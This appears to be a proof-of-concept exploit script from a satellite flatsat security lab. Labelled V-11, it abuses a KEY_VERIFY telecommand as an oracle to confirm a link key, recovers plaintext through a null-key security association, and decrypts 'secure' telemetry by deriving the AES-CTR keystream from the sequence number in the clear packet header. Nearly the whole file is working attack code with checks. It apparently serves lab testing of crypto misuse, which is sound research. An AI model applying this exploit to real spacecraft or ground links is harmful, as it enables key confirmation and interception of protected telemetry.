#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


# V-11  KEY_VERIFY CTR oracle + DEF_TM_CTR keystream recovery: the SPP
# sequence number (clear header!) IS the CTR counter -> encrypt-then-leak
# lets anyone decrypt any telemetry frame from its own header.
# SPARTA: CR-0003 / IV reuse (crypto misuse)
def main(dev, ev):
    # (a) key-confirmation oracle: query with the candidate key computed
    #     locally -- equality proves SA0 key WITHOUT ever seeing it.
    kid, ctr = 0, b"\x00\x00\x00\x07"
    pt = bytes(range(16))
    q = bytes([kid]) + ctr + pt
    r = dev.find(dev.tc(0x17, q, via="radio"), 0x17)[0]
    oracle = r.payload[2:18]
    guess = fs.ctr_xor(fs.LINK_KEY, bytes(12) + ctr, pt)
    ev.log(f"KEY_VERIFY(kid=0) -> {oracle.hex()}")
    ev.log(f"local ctr_xor(candidate='PWNsatLabKey1234') -> {guess.hex()}")
    check(oracle == guess, "oracle confirms the candidate SA0 key bit-exact")
    # null-key SA leaks plaintext through the same oracle:
    r44 = dev.find(dev.tc(0x17, bytes([44]) + ctr + pt, via="radio"), 0x17)[0]
    back = fs.ctr_xor(bytes(16), bytes(12) + ctr, r44.payload[2:18])
    check(back == pt, "null-key SA: keystream known -> plaintext recoverable")

    # (b) operator enables the 'CTR everywhere' defense; the counter is
    #     the TM sequence number, visible in the CLEAR primary header.
    dev.tc(0x25, bytes([0, 0xA0]), via="usb")        # DEF_TM_CTR | ANOMALY
    raw = dev._xfer(fs.spp_pack(0x0C, fs.aes_ecb_encrypt_wrap(fs.LINK_KEY, b""),
                                3), "usb")
    fr = raw[0]
    seq = struct.unpack(">H", fr[3:5])[0] & 0x3FFF
    body = fs.spp_unpack(fr[1:])["data"]
    plain = fs.ctr_xor(fs.LINK_KEY, bytes(12) + struct.pack(">I", seq), body)
    plen = struct.unpack(">H", plain[:2])[0]
    tm = plain[2:2 + plen]
    ev.log(f"captured TM seq={seq} -> recovered payload {tm[:10].hex()} "
           f"(mode=0x{tm[1]:02X})")
    check(tm[0] == 1, "header-derivable keystream decrypts the 'secure' TM")
    dev.tc(0x25, bytes([0, 0x80]), via="usb")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-11 key-verify oracle + CTR counter leak", main))
